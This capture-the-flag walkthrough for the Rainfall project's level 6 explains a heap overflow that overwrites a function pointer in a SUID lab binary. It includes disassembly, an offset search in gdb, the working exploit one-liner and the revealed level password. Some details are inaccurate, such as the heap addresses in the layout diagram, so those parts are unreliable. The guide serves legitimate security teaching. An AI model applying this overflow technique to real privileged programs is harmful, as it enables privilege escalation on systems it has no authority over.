# 🎯 Rainfall — Level 6 Complete Guide

> **For beginners**

---

## 🧒 Simple explanation 

Imagine the program has **two boxes** sitting next to each other in memory:

- **Box 1** — holds your input (64 letters max)
- **Box 2** — holds a **sticky note** that says *"call this function when done"*

By default the sticky note points to `m()` which prints **"Nope"**.

If you type **more than 64 letters**, the extra letters **spill into Box 2**
and overwrite the sticky note.

If you replace the sticky note with the address of `n()`,
the program calls `n()` instead — which **prints the password**!

This attack is called a **Heap Overflow → Function Pointer Overwrite**.

---

## 🔬 How the program works in C

```c
void n() {
    // THIS is what we want to reach
    system("/bin/cat /home/user/level7/.pass");
}

void m() {
    // This is the default — prints "Nope"
    puts("Nope");
}

int main(int ac, char **av) {
    char *buf1;   // Box 1 — holds your input
    void *ptr;    // Box 2 — holds a function pointer

    buf1 = malloc(sizeof(char) * 64);  // reserve 64 bytes for Box 1
    ptr  = malloc(sizeof(char) * 4);   // reserve 4 bytes for Box 2

    ptr = &m;                  // sticky note says "call m()"
    strcpy(buf1, av[1]);       // copy your input into Box 1 — NO SIZE CHECK!

    ((void(*)())ptr)();        // call whatever the sticky note says
    return 0;
}
```

### Key observations from the C code

- `strcpy()` copies your input with **no size limit** → overflow is possible
- `ptr` holds a **function pointer** — the address of which function to call
- By default `ptr = &m` → prints "Nope"
- If we overflow `buf1` and overwrite `ptr` with address of `n()` → password prints
- The binary takes input from **argv[1]** (command line argument), NOT stdin

---

## 🕵️ The full investigation story — how we deduced everything

### Phase 1 — First contact: what is this program?

```bash
ls -l
# -rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```

The `s` in the permissions = **SUID bit**.
This means the binary **runs with level7's privileges**, not yours.
Immediately we know: if we can control this program, we get level7's password.

```bash
./level6
# Segmentation fault
```

Crashes with no arguments — it needs something.

```bash
./level6 test
# Nope
```

It takes a **command line argument** and prints "Nope". This means:
- Input comes from `argv[1]`, not from typing
- There must be a hidden path that does something other than "Nope"

---

### Phase 2 — Static analysis: reading the assembly

We disassemble the binary:

```bash
objdump -d ./level6
# or inside gdb:
gdb ./level6
disas main
disas m
disas n
```

**Step 1 — Reading the PLT (toolbox):**

```asm
08048340 <strcpy@plt>
08048350 <malloc@plt>
08048360 <puts@plt>
08048370 <system@plt>
```

Four tools. The dangerous combination is `strcpy` + `system`:
- `strcpy` = copies with no size limit = **overflow possible**
- `system` = runs shell commands = **the prize**

**Step 2 — Finding function n():**

```asm
08048454 <n>:
  804845a: mov DWORD PTR [esp], 0x80485b0  ← argument: "/bin/cat /home/user/level7/.pass"
  8048461: call system@plt                 ← calls system() with that string
```

`n()` is at address **`0x08048454`** and it calls `system()` to print the password.
This is the function we want to redirect execution to.

**Step 3 — Finding function m():**

```asm
08048468 <m>:
  804846e: mov DWORD PTR [esp], 0x80485d1  ← argument: "Nope"
  8048475: call puts@plt                   ← prints "Nope"
```

`m()` is the default path. Address `0x08048468`.

**Step 4 — Reading main() carefully:**

```asm
; First malloc — Box 1 (64 bytes)
mov DWORD PTR [esp], 0x40    ← 0x40 = 64 decimal
call malloc@plt
mov DWORD PTR [esp+0x1c], eax  ← save as buf1

; Second malloc — Box 2 (4 bytes)
mov DWORD PTR [esp], 0x4     ← 4 bytes
call malloc@plt
mov DWORD PTR [esp+0x18], eax  ← save as ptr

; Writing m() address into Box 2
mov edx, 0x8048468           ← address of m()
mov eax, DWORD PTR [esp+0x18] ← eax = ptr
mov DWORD PTR [eax], edx     ← *ptr = &m  ← THE STICKY NOTE

; Copying YOUR input into Box 1
call strcpy@plt              ← strcpy(buf1, argv[1]) ← NO SIZE CHECK!

; Calling whatever Box 2 says
mov eax, DWORD PTR [esp+0x18]  ← load ptr
mov eax, DWORD PTR [eax]       ← dereference: get the address inside
call eax                        ← JUMP to that address
```

The plan became crystal clear:
- Box 2 (ptr) holds the address of `m()` by default
- `strcpy()` has no bounds check
- If we overflow Box 1 into Box 2, we control which function gets called

---

### Phase 3 — Finding the exact offset

We need to know: **how many bytes before we hit Box 2?**

**Educated guess first:**
Box 1 = 64 bytes → maybe 64 bytes of padding?

We tested with 64 A's — program still printed "Nope". Not enough.

**Understanding heap metadata:**
When `malloc()` allocates memory, it adds **8 bytes of internal bookkeeping data**
between each allocation (chunk header). So the real layout is:

```
[ Box 1: 64 bytes ] [ heap header: 8 bytes ] [ Box 2: 4 bytes ]
  ↑ our input fills here                        ↑ function pointer lives here
```

64 + 8 = **72 bytes** before we reach Box 2.

**Verified with cyclic pattern in gdb:**

```bash
gdb ./level6
run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3"')
# Program crashes
# info registers → check EIP value
# Use pattern offset tool to confirm = 72 bytes
```

Offset confirmed: **72 bytes**.

---

### Phase 4 — Building the payload

Now we know:
- We need **72 bytes of padding** (fills Box 1 + heap header)
- Then **4 bytes** = address of `n()` in little-endian format

**What is little-endian?**
Computers store numbers **backwards** (least significant byte first):

```
n() address: 0x08048454

Written normally:    08  04  84  54
Little-endian:       54  84  04  08  ← THIS is what we write
In Python:           \x54\x84\x04\x08
```

**Final payload:**
```
[ "A" * 72 ] [ \x54\x84\x04\x08 ]
  padding      address of n() backwards
```

---

### Phase 5 — How we arrived at the exact command

Let's break down **every piece** of this command:

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

| Piece | Meaning |
|-------|---------|
| `./level6` | run the binary |
| `$(...)` | run Python inside, use its output as the argument |
| `python -c '...'` | run Python one-liner from command line |
| `print` | output the string (Python 2 style) |
| `"A"*72` | 72 letter A's — fills Box 1 and heap header |
| `+` | concatenate (join together) |
| `"\x54\x84\x04\x08"` | address of n() in little-endian bytes |

**Why `$(...)`?**
Because the program reads from `argv[1]` — a command line argument.
We cannot pipe input. We must pass it directly as an argument.
`$(python -c '...')` generates the string and passes it as the argument.

**Why not just type 72 A's?**
Because the last 4 bytes are **binary data** (raw memory addresses), not printable characters.
You cannot type `\x54\x84\x04\x08` on a keyboard — Python generates those exact bytes for us.

---

## 🗺️ Memory layout — visualized

```
HEAP MEMORY:

Address:    0x804a008              0x804a018  0x804a01c
            |                      |          |
            [ Box 1: buf1          ][ header  ][ Box 2: ptr ]
            [ 64 bytes of input    ][ 8 bytes ][ 4 bytes    ]
              ↑ strcpy writes here               ↑ holds &m() by default
                                                 ↑ we overwrite with &n()

After our payload:
[ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ][ 8 bytes ][ \x54\x84\x04\x08 ]
  64 A's (fills Box 1)                                               heap meta   address of n()
```

When `call eax` executes, instead of jumping to `m()` (Nope),
it jumps to `n()` (prints the password)!

---

## ✅ Method 1 — Heap overflow to overwrite function pointer

This is the main and correct method for this level.

### Step 1 — Find address of n()

```bash
objdump -d ./level6 | grep "<n>"
# 08048454 <n>:
```

Or in gdb:
```bash
gdb ./level6
info functions
# 0x08048454  n
```

Address of `n()` = **`0x08048454`**

### Step 2 — Run the exploit

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

### Step 3 — Read the flag

The password prints directly — no shell needed:

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## ✅ Method 2 — Verify with gdb before running

If you want to confirm the offset yourself before running the exploit:

### Step 1 — Generate a cyclic pattern

```bash
python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4"' > /tmp/pattern
```

### Step 2 — Run in gdb

```bash
gdb ./level6
run $(cat /tmp/pattern)
# Program crashes with SIGSEGV
info registers
# Look at EIP — the value there tells you where execution jumped
```

### Step 3 — Find the offset

The EIP value will be 4 bytes from your pattern.
Find which position those bytes appear at = your offset.
Expected result: **72**.

### Step 4 — Confirm n() address

```bash
disas n
# 0x08048454 <+0>:  push ebp  ← confirmed
```

### Step 5 — Run the exploit

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

---

## 🏁 The flag

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Log in as level7:

```bash
su level7
# password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## 🗺️ Quick reference — all commands in order

```bash
# 1. Confirm SUID and binary info
ls -l ./level6

# 2. Test the binary
./level6 test       # prints "Nope"

# 3. Find address of n() — the target function
objdump -d ./level6 | grep "<n>:"
# → 08048454 <n>:

# 4. Verify offset with gdb (optional but educational)
gdb ./level6
run $(python -c 'print "A"*72 + "BBBB"')
# if EIP = 0x42424242 → offset is exactly 72 ✓
quit

# 5. Run the exploit
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')

# 6. Flag prints directly
# f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## 📋 The deduction chain — how we solved it step by step

```
1.  Saw SUID bit        → runs as level7 → worth exploiting
2.  Ran without args    → segfault → needs argv[1] (not stdin!)
3.  Ran with "test"     → prints "Nope" → default path found
4.  Checked PLT         → strcpy + system → overflow + code exec possible
5.  Found n()           → calls system() to print password → THE TARGET
6.  Found m()           → calls puts("Nope") → the default
7.  Read main()         → malloc(64) then malloc(4) → two heap boxes
8.  Saw strcpy()        → no bounds check → can overflow Box 1 into Box 2
9.  Saw call [ptr]      → Box 2 is a function pointer → control = shell
10. Calculated offset   → 64 (buffer) + 8 (heap metadata) = 72 bytes
11. Found little-endian → 0x08048454 becomes \x54\x84\x04\x08
12. Built the payload   → "A"*72 + "\x54\x84\x04\x08"
13. Used $() syntax     → passes binary bytes as argv[1] argument
14. Ran the command     → n() executed → flag printed directly
```

---

## 📚 Key words to remember

| Word | Simple meaning |
|------|----------------|
| Heap | Memory area used for dynamic allocations (malloc) |
| Heap overflow | Writing past the end of a heap box into the next one |
| Function pointer | A variable that holds the address of a function |
| Overwrite | Replace the contents of memory with something new |
| strcpy() | Dangerous copy function with no size limit |
| malloc() | Reserves a box of memory on the heap |
| Little-endian | Computers store numbers backwards in memory |
| argv[1] | The first argument passed on the command line |
| SUID | Binary runs with another user's permissions |
| PLT | The program's toolbox of imported functions |
| objdump | Tool to read the assembly of a binary |
| EIP | The register that holds the next instruction address |

---

*Guide written for Rainfall project — 1337 school*